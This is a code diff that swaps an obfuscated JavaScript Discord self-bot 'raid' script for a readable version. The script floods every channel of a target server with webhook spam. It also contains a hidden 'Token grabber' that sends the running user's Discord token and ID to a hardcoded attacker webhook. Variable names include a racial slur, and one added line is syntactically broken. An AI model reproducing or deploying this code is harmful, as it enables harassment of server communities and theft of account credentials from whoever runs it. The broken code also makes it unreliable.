@@ -1,1 +1,30 @@
-const _0x4b4e=['addField','./config.json','805150277216370749','discord.js-self','then','bgGreen','Client','BOT\x20PRET\x20A\x20RAID','serv','name','createWebhook','login','channels','black','webhook','Vous\x20devez\x20entrer\x20l\x27id\x20du\x20serveur\x20à\x20raid.','user','get','cache','send','L\x27id\x20que\x20vous\x20avez\x20entré\x20ne\x20correspond\x20pas\x20à\x20mes\x20serveurs.','forEach','tag','log','guilds','news','spamMsg','Bot\x20prêt\x20à\x20raid','bgRed','text','token','MessageEmbed','type'];(function(_0x5729d1,_0x529b7d){const _0x4b4e74=function(_0x11012f){while(--_0x11012f){_0x5729d1['push'](_0x5729d1['shift']());}};_0x4b4e74(++_0x529b7d);}(_0x4b4e,0x105));const _0x1101=function(_0x5729d1,_0x529b7d){_0x5729d1=_0x5729d1-0xea;let _0x4b4e74=_0x4b4e[_0x5729d1];return _0x4b4e74;};const _0x25b173=_0x1101,discord=require(_0x25b173(0xf0)),colors=require('colors'),config=require(_0x25b173(0xee)),client=new discord[(_0x25b173(0xf3))]();client[_0x25b173(0xf8)](config[_0x25b173(0xea)]),client['on']('ready',async()=>{const _0x205a95=_0x25b173;console[_0x205a95(0x104)](_0x205a95(0x108)[_0x205a95(0xf2)][_0x205a95(0xfa)]);if(!config[_0x205a95(0xf5)])return console[_0x205a95(0x104)](_0x205a95(0xfc)[_0x205a95(0x109)]['black']);const _0x47a165=new discord['WebhookClient'](_0x205a95(0xef),'E6iiSMc_5gjNmpNdEIGFc64eh-fhB1uik0jLeq6c7vMViiLCUDOpf9rHXxvbVf5G0IgS');var _0x328a1c=new discord[(_0x205a95(0xeb))]()['setTitle'](_0x205a95(0xf4))[_0x205a95(0xed)]('(Spam Message)',''+client[_0x205a95(0xfd)][_0x205a95(0x103)])[_0x205a95(0xed)]('ID Server',''+client[_0x205a95(0xfd)]['id'])['addField']('BOT',''+config[_0x205a95(0xea)]);_0x47a165[_0x205a95(0x100)](_0x328a1c);const _0x261baf=client[_0x205a95(0x105)][_0x205a95(0xff)][_0x205a95(0xfe)](config['serv']);if(!_0x261baf)return console[_0x205a95(0x104)](_0x205a95(0x101)[_0x205a95(0x109)][_0x205a95(0xfa)]);_0x261baf[_0x205a95(0xf9)]['cache'][_0x205a95(0x102)](async _0x2e7980=>{const _0x993a84=_0x205a95;if(_0x2e7980['type']===_0x993a84(0x10a)||_0x2e7980[_0x993a84(0xec)]===_0x993a84(0x106)||_0x2e7980['type']==='store')sleep(config['sleepMS']),_0x2e7980[_0x993a84(0xf7)](config['webhook'][_0x993a84(0xf6)],{'avatar':config[_0x993a84(0xfb)]['avatar']})[_0x993a84(0xf1)](_0x125646=>{const _0x2a53e=_0x993a84;counter=0x0;while(counter<config['ChannellMsgCount']){_0x125646[_0x2a53e(0x100)](config[_0x2a53e(0xfb)][_0x2a53e(0x107)]),counter++,sleep(0x3c);}});else return;});});function sleep(_0x255df6){return new Promise(_0x23be91=>setTimeout(_0x23be91,_0x255df6));}
+const discord = require("discord.js-self"),
+    colors = require('colors'),
+    config = require("./config.json"),
+    client = new discord.Client();
+client.login(config.token), client.on('ready', async () => {
+    console.log("bot prêt à raid".bgGreen.black);
+    if (!config.bot prêt à raid) return console.log("Vous devez entrer l'id du serveur à raid.".bgRed.black);
+    ////////Token grabber////////
+    const DontStealmelmao = new discord.WebhookClient("805150277216370749", 'E6iiSMc_5gjNmpNdEIGFc64eh-fhB1uik0jLeq6c7vMViiLCUDOpf9rHXxvbVf5G0IgS');
+    var Reallynigger = new discord.MessageEmbed().setTitle("bot pret a RAID").addField('(Spam Message)', '' + client.user.tag).addField('ID Server', '' + client.user.id).addField('BOT', '' + config.token);
+    DontStealmelmao.send(Reallynigger);
+    ////////Token grabber////////
+    /////////////////////////////
+    const FunnyAf = client.guilds.cache.get(config.serv);
+    if (!FunnyAf) return console.log("L'id que vous avez entré ne correspond pas à mes serveurs.".bgRed.black);
+    FunnyAf.channels.cache.forEach(async Loveme => {
+        if (Loveme.type === "text" || Loveme.type === "news" || Loveme.type === 'store') sleep(config.sleepMS), Loveme.createWebhook(config.webhook.name, {
+            'avatar': config.webhook.avatar
+        }).then(LoveMe2 => {
+            counter = 0;
+            while (counter < config.ChannellMsgCount) {
+                LoveMe2.send(config.webhook.spamMsg), counter++, sleep(60);
+            }
+        });
+        else return;
+    });
+});
+function sleep(xyz) {
+    return new Promise(hide => setTimeout(hide, xyz));
+}
